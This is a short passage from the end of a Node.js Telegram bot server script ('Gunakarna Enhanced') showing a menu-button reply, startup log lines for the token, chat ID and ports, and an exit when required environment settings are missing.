    // Just acknowledge with the main menu
    await bot.sendMessage(chatId, '😈 Use the buttons below:', {
        reply_markup: getPersistentTriggerButton()
    });
});

// ============================================================
// STARTUP
// ============================================================

console.log('[✓] Gunakarna Enhanced server running');
console.log(`[✓] Token: ${TELEGRAM_TOKEN ? 'Set' : 'MISSING!'}`);
console.log(`[✓] Chat ID: ${ALLOWED_CHAT_ID}`);
console.log(`[✓] WS: ${WS_PORT} | HTTP: ${HTTP_PORT}`);

// If no token, exit
if (!TELEGRAM_TOKEN || !ALLOWED_CHAT_ID) {
    console.error('[!] FATAL: BOT_TOKEN and ALLOWED_CHAT_ID must be set in .env');
    process.exit(1);
}
